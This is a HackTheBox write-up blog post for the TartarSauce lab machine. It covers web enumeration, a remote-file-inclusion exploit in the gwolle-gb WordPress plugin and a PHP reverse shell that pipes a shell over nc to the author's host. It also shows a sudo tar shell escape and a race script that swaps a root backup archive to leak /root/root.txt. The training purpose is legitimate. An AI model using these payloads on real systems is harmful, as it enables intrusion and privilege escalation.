<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TartarSauce | PwndSide</title><meta name=keywords content="privesc,web,linux,scripting"><meta name=description content="Linux machine with a website which has two CMS one of them called WordPress has a plugin with RFI. A sudoer command allow us to privEsc to onuma. Thanks to a scheduled cronjob which execute a script we are able to leak information in order to PrivEsc."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="TartarSauce"><meta property="og:description" content="Linux machine with a website which has two CMS one of them called WordPress has a plugin with RFI. A sudoer command allow us to privEsc to onuma. Thanks to a scheduled cronjob which execute a script we are able to leak information in order to PrivEsc."><meta property="og:type" content="article"><meta property="og:url" content="https://pwndside.github.io/posts/tartarsauce-htb/"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-02T14:28:00+02:00"><meta property="article:modified_time" content="2023-09-02T14:28:00+02:00"><meta property="og:site_name" content="PwndSide"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="TartarSauce"><meta name=twitter:description content="Linux machine with a website which has two CMS one of them called WordPress has a plugin with RFI. A sudoer command allow us to privEsc to onuma. Thanks to a scheduled cronjob which execute a script we are able to leak information in order to PrivEsc."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"TartarSauce","item":"https://pwndside.github.io/posts/tartarsauce-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TartarSauce","name":"TartarSauce","description":"Linux machine with a website which has two CMS one of them called WordPress has a plugin with RFI. A sudoer command allow us to privEsc to onuma. Thanks to a scheduled cronjob which execute a script we are able to leak information in order to PrivEsc.","keywords":["privesc","web","linux","scripting"],"articleBody":"Room Information Room name: TartarSauce Difficulty level: Medium Room link: https://app.hackthebox.com/machines/TartarSauce Tools Used nmap searchsploit wpsan Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 63 Only one port open which is running a http server. This is gonna be our point of entry\nEnumeration Accessing to the website a tartarsauce is displayed.\nThe source code doesnt show anything useful only the following message So I decided to do a quick fuzz to the page in order to see some directories.\nThis time I am gonna using gobuster i better for the extensions fuzz.\ngobuster dir -u http://10.10.10.88/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -t 100 -o fuzz | tee fuzz.save /index.html (Status: 200) [Size: 10766] /robots.txt (Status: 200) [Size: 208] /robots.txt (Status: 200) [Size: 208] /server-status (Status: 403) [Size: 299] /webservices (Status: 301) [Size: 316] [--\u003e http://10.10.10.88/webservices/] Progress: 36912 / 36920 (99.98%) =============================================================== Finished =============================================================== We can see two interesting ones /robots.txt and /web-services\nWhen we try to access to /web-services we get a Forbidden page\nAccessing /robots.txt we can clearly see some other directories which doesnt leak gobuster.\nUser-agent: * Disallow: /webservices/tar/tar/source/ Disallow: /webservices/monstra-3.0.4/ Disallow: /webservices/easy-file-uploader/ Disallow: /webservices/developmental/ Disallow: /webservices/phpmyadmin/ So before accessing to that links, as they are all webservices directories I decided to fuzz again but this time the webservices directory.\n[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 131ms] | URL | http://10.10.10.88/webservices/wp | --\u003e | http://10.10.10.88/webservices/wp/ * FUZZ: wp We can clearly see a WordPress page, I like to call it VulnPress because always has critical vulns on their plugins so I decide to perform a WPScan.\nwpscan --url http://10.10.10.88/webservices/wp/ --enumerate p, t, u | tee wpscan.log _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ 庐 \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88] [+] Started: Sat Sep 2 11:37:16 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.9.4' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4' [i] The main theme could not be detected. [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Sep 2 11:37:18 2023 [+] Requests Done: 2 [+] Cached Requests: 27 [+] Data Sent: 654 B [+] Data Received: 1.055 KB [+] Memory used: 259.656 MB [+] Elapsed time: 00:00:01 Doesnt find any plugin so I start other fuzz with a SecLists plugin wordlist in order to enumerate existent plugins.\nffuf -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u http://10.10.10.88/webservices/wp/FUZZ -c -v -t 200 -o fuzz3 | tee fuzz3.save [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 139ms] | URL | http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/ * FUZZ: wp-content/plugins/akismet/ [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 143ms] | URL | http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/ * FUZZ: wp-content/plugins/gwolle-gb/ [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 147ms] | URL | http://10.10.10.88/webservices/wp/wp-content/plugins/hello.php/ * FUZZ: wp-content/plugins/hello.php/ [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 147ms] | URL | http://10.10.10.88/webservices/wp/wp-content/plugins/hello.php * FUZZ: wp-content/plugins/hello.php We have two plugins but we dont know if they are vulnerable.\nExploiting Searching on searchsploit I found one RFI exploit for gwolle-gb.\nThat exploit takes advantage of improper sanitation of abspath GET parameter allowing us to access to a remote php file named wp-load.php.\nI changed a little bit the URL adding /webservices/wp/\nhttp://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.9/ So I created a php one line reverse shell and changed his name to wp-load.php.\n\u003c?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.9 4444 \u003e/tmp/f\") ?\u003e Once done I started a python http server, set a nc listener and send a request to the RFI URL.\npython3 -m http.server 80 nc -lv 4444 Gaining an Initial Foothold We are www-data now.\nNavigating to the homes directory we can see one folder called onuma.\nWhen I tried to access in order to cat the users flag I receive the following error.\nThis is a sign that we need to privEsc.\nEscalating Privilege First I checked for sudo -l privileges.\nMatching Defaults entries for www-data on TartarSauce: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on TartarSauce: (onuma) NOPASSWD: /bin/tar We can use /bin/tar as onuma and looking up on GTFOBins we can see that is possible to privEsc with the following command.\nsudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh At onumas home directory we can see a .mysql_history file which seems not empty.\n_HiStOrY_V2_ create\\040database\\040backuperer; exit It seems like is trying to create a database called backuperer.\nI tried to run mysql command with common credentials but failed.\nSo I used moniProc.sh which is a bash script which I used in a lot of writeups in order to see scheduled processes.\n\u003e /usr/sbin/CRON -f \u003e /bin/bash /usr/sbin/backuperer \u003e /lib/systemd/systemd-udevd \u003e /lib/systemd/systemd-udevd \u003e /lib/systemd/systemd-udevd \u003e /lib/systemd/systemd-udevd \u003e /lib/systemd/systemd-udevd \u003c /lib/systemd/systemd-udevd \u003c /lib/systemd/systemd-udevd \u003c /lib/systemd/systemd-udevd \u003c /lib/systemd/systemd-udevd \u003c /lib/systemd/systemd-udevd \u003e /bin/bash /usr/sbin/backuperer \u003c /bin/bash /usr/sbin/backuperer \u003e /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html \u003e /bin/sleep 30 \u003e /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html \u003e gzip \u003c /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html \u003c /bin/tar -zcvf /var/tmp/.a0a3b766a63bc5f8a1f3b9249c17a481ee819547 /var/www/html \u003c gzip We can observe with the moniProc.sh output that we have a cronjob executing on the background a bash script located at /usr/sbin/backuperer.\nIts the second time we see such name on the machine and I dont think its a coincidence.\n#!/bin/bash #------------------------------------------------------------------------------------- # backuperer ver 1.0.2 - by g头图 # ONUMA Dev auto backup program # This tool will keep our webapp backed up incase another skiddie defaces us again. # We will be able to quickly restore from a backup in seconds ;P #------------------------------------------------------------------------------------- # Set Vars Here basedir=/var/www/html bkpdir=/var/backups tmpdir=/var/tmp testmsg=$bkpdir/onuma_backup_test.txt errormsg=$bkpdir/onuma_backup_error.txt tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1) check=$tmpdir/check # formatting printbdr() { for n in $(seq 72); do /usr/bin/printf $\"-\"; done } bdr=$(printbdr) # Added a test file to let us see when the last backup was run /usr/bin/printf $\"$bdr\\nAuto backup backuperer backup last ran at : $(/bin/date)\\n$bdr\\n\" \u003e $testmsg # Cleanup from last time. /bin/rm -rf $tmpdir/.* $check # Backup onuma website dev files. /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir \u0026 # Added delay to wait for backup to complete if large files get added. /bin/sleep 30 # Test the backup integrity integrity_chk() { /usr/bin/diff -r $basedir $check$basedir } /bin/mkdir $check /bin/tar -zxvf $tmpfile -C $check if [[ $(integrity_chk) ]] then # Report errors so the dev can investigate the issue. /usr/bin/printf $\"$bdr\\nIntegrity Check Error in backup last ran : $(/bin/date)\\n$bdr\\n$tmpfile\\n\" \u003e\u003e $errormsg integrity_chk \u003e\u003e $errormsg exit 2 else # Clean up and save archive to the bkpdir. /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak /bin/rm -rf $check .* exit 0 fi Basically the program starts removing all the content starting with a dot on /var/tmp and the /var/tmp/check directory then creates a tar of /var/www/html with a name started with a dot followed by a hash and saves the backup temporarily on /var/tmp.\nOnce done the program sleeps 30 seconds and after that extracts the backup content on /var/tmp/check in order to check the integrity.\nOnce extracted the program checks if the integrity_chk() function output something which basically runs a diff of the files extracted and the files on\n/var/www/html.\nIf the file are modified the diff function output is saved on /var/backups/onuma_backup_error.txt\nIf nothing is outputted by the integrity_chk() function the zip file is saved on /var/backups/onuma-www-dev.bak\nFinally all the content starting with a dot and the /var/check directory is removed.\nSo I realized as we can write on /var/tmp and backuperer is executed as root if we try to get the hash of the file and change the backup files to other one a little bit modified we can get information leak by diff function at /var/backups/onuma_backup_error.txt\nwatch -n 1 ls -la /var/tmp Every 1.0s: ls -la /var/tmp Sat Sep 2 07:36:11 2023 total 11284 drwxrwxrwt 10 root root 4096 Sep 2 07:36 . drwxr-xr-x 14 root root 4096 May 12 2022 .. -rw-r--r-- 1 onuma onuma 11511296 Sep 2 07:36 .0beccd6f392b2e0f1a5676f11cbe845f4d5c5814 drwx------ 3 root root 4096 May 12 2022 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS drwx------ 3 root root 4096 May 12 2022 systemd-private-4e3fb5c5d5a044118936f5728368dfc7-systemd-timesyncd.service-SksmwR drwx------ 3 root root 4096 May 12 2022 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ drwx------ 3 root root 4096 May 12 2022 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R drwx------ 3 root root 4096 May 12 2022 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td drwx------ 3 root root 4096 Sep 2 05:14 systemd-private-af355da20cf24e91b8a040c8e7aa1462-systemd-timesyncd.service-NYmoBL drwx------ 3 root root 4096 May 12 2022 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER drwx------ 3 root root 4096 May 12 2022 systemd-private-e11430f63fc04ed6bd67ec90687cb00e-systemd-timesyncd.service-PYhxgX Thanks to the previous command we can see every second the changes on the directory.\nTheres one file named with a dot and followed by 40 characters. So we only need a regex for it\nls -la /var/tmp | grep -oP '\\.\\w{40}' The above command help us to list that type of files.\n#!/bin/bash while true; do filename=\"$(ls -la /var/tmp/ | grep -oP '\\.\\w{40}')\" if [ \"$filename\" ]; then echo \"Found a file with a hash in the name\" echo \"Removing file...\" rm /var/tmp/$filename echo \"Changing the file...\" mv payload /var/tmp/$filename echo \"Done\" exit 0 fi done So with the following exploit we can save the hash name on a variable and rename or payload file in order to change the backup file.\nNow the thing is to build a backup payload, first I am going to tar the /var/www/html folder and send it via python http server.\ntar -zcvf payload /var/www/html Once done lets extracted with\ntar -zxvf payload . Now we only need to delete the existent index.html file and put as sudo a soft link to /root/root.txt as we are on our system we are able to do it.\nrm index.html sudo su ln -s /root/root.txt index.html Once executed we have now the modified backup file, now when the programs runs a diff with our modified data its gonna leak the root.txt flag.\nWe need now to send the crafted exploit and the payload previously zipped with tar to the remote machine in the same directory.\nOnce executed we receive the waited output.\nLets check /var/backups/onuma_backup_error.txt for the roots flag.\nThank you for reading, and happy hacking! \n","wordCount":"1857","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-09-02T14:28:00+02:00","dateModified":"2023-09-02T14:28:00+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/tartarsauce-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;禄&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class=post-title>TartarSauce</h1><div class=post-description>Linux machine with a website which has two CMS one of them called WordPress has a plugin with RFI. A sudoer command allow us to privEsc to onuma. Thanks to a scheduled cronjob which execute a script we are able to leak information in order to PrivEsc.</div><div class=post-meta><span title='2023-09-02 14:28:00 +0200 CEST'>September 2, 2023</span>&nbsp;路&nbsp;9 min&nbsp;路&nbsp;1857 words&nbsp;路&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/tartarsauce-htb.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: TartarSauce</li><li>Difficulty level: Medium</li><li>Room link: <a href=https://app.hackthebox.com/machines/TartarSauce>https://app.hackthebox.com/machines/TartarSauce</a></li></ul><p><img loading=lazy src=/HTB/tartar-icon.png alt=Untitled></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li><li>searchsploit</li><li>wpsan</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT   STATE SERVICE REASON
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>63</span>
</span></span></code></pre></div><p>Only one port open which is running a <strong>http</strong> server. This is gonna be our point of entry</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p><img loading=lazy src=/HTB/tartar-1.png alt=Untitled></p><p>Accessing to the website a tartarsauce is displayed.</p><p>The <strong>source code</strong> doesnt show anything useful only the following message <code>&lt;!--Carry on, nothing to see here :D--></code></p><p>So I decided to do a quick <strong>fuzz</strong> to the page in order to see some directories.</p><p>This time I am gonna using <strong>gobuster</strong> i better for the extensions fuzz.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.10.10.88/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -t <span class=m>100</span> -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 10766<span class=o>]</span>
</span></span><span class=line><span class=cl>/robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 208<span class=o>]</span>
</span></span><span class=line><span class=cl>/robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 208<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
</span></span><span class=line><span class=cl>/webservices          <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 316<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.10.88/webservices/<span class=o>]</span>
</span></span><span class=line><span class=cl>Progress: <span class=m>36912</span> / <span class=m>36920</span> <span class=o>(</span>99.98%<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>We can see two interesting ones <code>/robots.txt</code> and <code>/web-services</code></p><p>When we try to access to <code>/web-services</code> we get a Forbidden page</p><p><img loading=lazy src=/HTB/tartar-2.png alt=Untitled></p><p>Accessing <code>/robots.txt</code> we can clearly see some other directories which doesnt leak <strong>gobuster</strong>.</p><pre tabindex=0><code>User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
</code></pre><p>So before accessing to that links, as they are all webservices directories I decided to <strong>fuzz</strong> again but this time the <strong>webservices directory</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 131ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span> URL <span class=p>|</span> http://10.10.10.88/webservices/wp
</span></span><span class=line><span class=cl><span class=p>|</span> --&gt; <span class=p>|</span> http://10.10.10.88/webservices/wp/
</span></span><span class=line><span class=cl>    * FUZZ: wp
</span></span></code></pre></div><p>We can clearly see a <strong>WordPress</strong> page, I like to call it VulnPress because always has critical vulns on their plugins so I decide to perform a <strong>WPScan</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p, t, u <span class=p>|</span> tee wpscan.log
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>_______________________________________________________________
</span></span><span class=line><span class=cl>         __          _______   _____
</span></span><span class=line><span class=cl>         <span class=se>\ \ </span>       / /  __ <span class=se>\ </span>/ ____<span class=p>|</span>
</span></span><span class=line><span class=cl>          <span class=se>\ \ </span> /<span class=se>\ </span> / /<span class=p>|</span> <span class=p>|</span>__<span class=o>)</span> <span class=p>|</span> <span class=o>(</span>___   ___  __ _ _ __ 庐
</span></span><span class=line><span class=cl>           <span class=se>\ \/</span>  <span class=se>\/</span> / <span class=p>|</span>  ___/ <span class=se>\_</span>__ <span class=se>\ </span>/ __<span class=p>|</span>/ _<span class=sb>`</span> <span class=p>|</span> <span class=s1>&#39;_ \
</span></span></span><span class=line><span class=cl><span class=s1>            \  /\  /  | |     ____) | (__| (_| | | | |
</span></span></span><span class=line><span class=cl><span class=s1>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>         WordPress Security Scanner by the WPScan Team
</span></span></span><span class=line><span class=cl><span class=s1>                         Version 3.8.24
</span></span></span><span class=line><span class=cl><span class=s1>       Sponsored by Automattic - https://automattic.com/
</span></span></span><span class=line><span class=cl><span class=s1>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span></span></span><span class=line><span class=cl><span class=s1>_______________________________________________________________
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
</span></span></span><span class=line><span class=cl><span class=s1>[+] Started: Sat Sep  2 11:37:16 2023
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>Interesting Finding(s):
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[+] Headers
</span></span></span><span class=line><span class=cl><span class=s1> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=s1> | Found By: Headers (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=s1> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
</span></span></span><span class=line><span class=cl><span class=s1> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=s1> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=s1> | References:
</span></span></span><span class=line><span class=cl><span class=s1> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
</span></span></span><span class=line><span class=cl><span class=s1> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span></span></span><span class=line><span class=cl><span class=s1> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span></span></span><span class=line><span class=cl><span class=s1> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span></span></span><span class=line><span class=cl><span class=s1> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
</span></span></span><span class=line><span class=cl><span class=s1> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=s1> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
</span></span></span><span class=line><span class=cl><span class=s1> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=s1> | Confidence: 60%
</span></span></span><span class=line><span class=cl><span class=s1> | References:
</span></span></span><span class=line><span class=cl><span class=s1> |  - https://www.iplocation.net/defend-wordpress-from-ddos
</span></span></span><span class=line><span class=cl><span class=s1> |  - https://github.com/wpscanteam/wpscan/issues/1299
</span></span></span><span class=line><span class=cl><span class=s1>
